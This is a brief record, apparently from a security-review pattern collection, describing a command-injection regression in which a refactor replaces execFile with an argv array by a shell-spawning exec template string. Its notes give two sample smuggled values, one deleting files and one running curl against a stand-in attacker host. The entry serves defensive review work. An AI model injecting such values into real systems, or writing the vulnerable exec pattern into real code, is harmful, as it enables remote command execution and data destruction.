name: Command injection via execFile→exec regression (CVE-2023-26136 family)
pattern_description: Refactor swaps `execFile(name, [args])` (no shell, argv array, safe) for `exec(template-string)` (spawns sh -c, vulnerable to shell metacharacters in srcPath/sizePx). The argv-array protection was the explicit safety the original code relied on.
notes: If srcPath contains `; rm -rf /tmp/*` or `$(curl evil.example.com)`, command substitution will fire on the server. The diff explicitly removes the comment that warned about this — a strong regression indicator.
